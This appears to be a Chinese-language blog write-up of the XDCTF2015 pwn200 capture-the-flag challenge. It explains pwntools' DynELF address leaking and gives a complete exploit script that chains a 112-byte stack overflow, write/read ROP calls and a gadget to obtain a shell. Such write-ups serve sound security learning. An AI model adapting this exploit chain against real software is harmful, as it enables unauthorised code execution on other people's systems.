---
title: CTF | XDCTF2015-pwn200(DynELF)
date: 2018-03-18 19:40:11
tags: pwn
---
该题用到了 `DynELF` 技术  

`DynELF` 是 `pwntools` 中专门用来应对无 `libc` 情况的漏洞利用模块，其基本代码框架如下。
```python
p = process('./xxx')
def leak(address):
  #各种预处理
  payload = "xxxxxxxx" + address + "xxxxxxxx"
  p.send(payload)
  #各种处理
  data = p.recv(4)
  return data
d = DynELF(leak, elf=ELF("./xxx"))      #初始化DynELF模块 
systemAddress = d.lookup('system', 'libc')  #在libc文件中搜索system函数的地址
```
再看 `read` 函数：
定义函数：`ssize_t read(int fd, void * buf, size_t count);  `
函数说明：`read()`会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中.  若参数 `count` 为 0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.  

思路：   
1.调用 `main` 函数循环利用    
2.泄露出 `system` 地址   
3.写入`”/bin/sh” `   
4.调用 `system` 获取 `shell` ，在实际调用 `system` 前，需要通过三次 `pop` 操作来将栈指针指向 `systemAddress` 。保证堆栈平衡

查找gadget：
`ROPgadget --binary pwn200 --only "pop|ret"`   
使用：
`0x08048649 : pop esi ; pop edi ; pop ebp ; ret`   

```python
from pwn import *
elf = ELF('./pwn200')
io = process('./pwn200')
write_plt = elf.plt['write'] # symbols 也可以
read_plt = elf.plt['read']
main_addr = 0x80483e0 
bss_addr = elf.bss() #用来存储'/bin/sh'
pppr = 0x08048649 

def leak(addr):
    io.recvuntil('Welcome to XDCTF2015~!\n')
    payload = 'a'*112+p32(write_plt)+p32(main_addr)+p32(1)+p32(addr)+p32(4)
    io.sendline(payload)
    msg = io.recv(4)
    return msg

dyn = DynELF(leak,elf=elf)  
sys_addr = dyn.lookup('system','libc')
payload = 'a'*112+p32(read_plt)+p32(pppr)+p32(0)+p32(bss_addr)+p32(8)+p32(sys_addr)+p32(main_addr)+p32(bss_addr)
io.sendline(payload)
io.sendline('/bin/sh\0')
io.interactive()
```
